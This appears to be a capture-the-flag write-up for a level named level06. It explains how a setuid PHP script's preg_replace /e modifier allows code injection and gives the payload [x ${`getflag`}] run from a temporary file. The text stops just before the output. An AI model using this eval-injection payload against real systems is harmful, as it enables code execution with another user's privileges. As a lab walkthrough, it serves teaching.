In the home directory, there exists a .php file named level06.php, which serves as the source code for the program level06.
The program level06 has setuid bits, denoted as:

```bash
-rwsr-x---+ 1 flag06 level06 7503 Aug 30 2015 level06
```

This signifies that the program is always executed with the privileges of the user flag06.

The content of level06.php is as follows:

```php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

The PHP script utilizes the function x() with user-supplied arguments:

```php
x($argv[1], $argv[2]);
```

It then opens the file path specified in the first argument:

```php
$a = file_get_contents($y);
```

Finally, it captures the pattern /[x (.*)]/ and executes what was captured using the eval regex modifier `(/e)`:

```php
preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

To exploit this, we need to create a file and provide its path as an argument.
Using the backtick (PHP execution operator) around the command `getflag`, we initially create the file as:

```
[x `getflag`]
```

However, due to PHP string analysis, this won't work as intended because the matched string "`getflag`" won't be interpreted. Instead, we must use the complex syntax for the interpretation of complex expressions:

```
[x ${`getflag`}]
```

Executing this with the following command:

```bash
./level06 /tmp/payload
```

Results in an error, but the matched expression is evaluated:
